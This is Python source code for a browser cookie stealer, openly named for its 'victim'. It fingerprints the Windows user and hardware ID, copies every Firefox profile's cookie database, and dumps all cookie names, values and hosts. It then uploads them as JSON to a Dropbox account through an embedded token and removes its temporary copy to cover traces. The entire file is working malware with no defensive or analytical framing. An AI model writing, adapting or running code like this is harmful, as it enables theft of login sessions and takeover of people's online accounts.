import sqlite3
import os
import subprocess
import dropbox
from time import time
import json
import shutil

class DropboxFirefoxCookieHarvester:

	def __init__(self, config):
		self.config = config
		self._victim_username = os.getlogin()
		self._victim_hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].split(' ')[0]
		substr_replacements: dict = {
			'`hwid`': self._victim_hwid,
			'`victim_username`': self._victim_username
		}
		# replace special substrs in config
		for key in self.config.keys():
			if type(self.config[key]) is not str:
				continue
			for old_substr, new_substr in substr_replacements.items():
				self.config[key] = self.config[key].replace(old_substr, new_substr)

	def run(self):
		# each profile in firefox has its own cookies
		profiles_dir_path = \
			f'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'
		# each profile has its cookies stored in the profile's own directory
		profile_dirs = \
			[dirname for dirname in os.listdir(profiles_dir_path) if os.path.isdir(os.path.join(profiles_dir_path, dirname))]

		# {profile_name: {domain: [cookie1, cookie2, ...]}}
		cookies = {}

		# convert firefox timestamps to datetime
		# firefox timestamp is 1 mil * unix timestamp
		# https://stackoverflow.com/questions/19429577/converting-the-date-within-the-places-sqlite-file-in-firefox-to-a-datetime

		for dirname in profile_dirs:
			cookies[dirname] = []
			try:
				# copy the db so it can be accessed while firefox is open
				cookies_db_path = os.path.join(profiles_dir_path, dirname, 'cookies.sqlite')
				path_copied_to = os.path.abspath(self.config['copy_db_filepath'])
				shutil.copyfile(cookies_db_path, path_copied_to) # change from cwd to designated copy dir
				cookies_db_path = path_copied_to
				# select the cookies from the db
				conn = sqlite3.connect(cookies_db_path)
				cur = conn.cursor()
				cur.execute('SELECT * FROM moz_cookies')
				# populate the results table of the cursor
				data = cur.fetchall()
				# go through each cookie and pick out the ones we are interested in 
				# then store them in the dict for collected cookies
				for cookie in data:
					cookie_name = cookie[2]
					cookie_value = cookie[3]
					cookie_domain = cookie[4]
					cookie_is_secure = cookie[11]
					cookies[dirname].append({
						'host': cookie_domain, 
						'name': cookie_name, 
						'value': cookie_value,
						'isSecure': cookie_is_secure
					})
			except sqlite3.OperationalError:
				continue

		content = json.dumps(cookies, indent=self.config['output_json_indent_level'])
		output_filename = str(round(time() * 1000)) + '.json'
		dropbox_filepath = (self.config['output_dropbox_dirpath'] + '/' + output_filename).replace('//', '/')
		dbx = dropbox.Dropbox(self.config['dropbox_token'])
		dbx.files_upload(content.encode('utf-8'), dropbox_filepath)
		os.remove(self.config['copy_db_filepath'])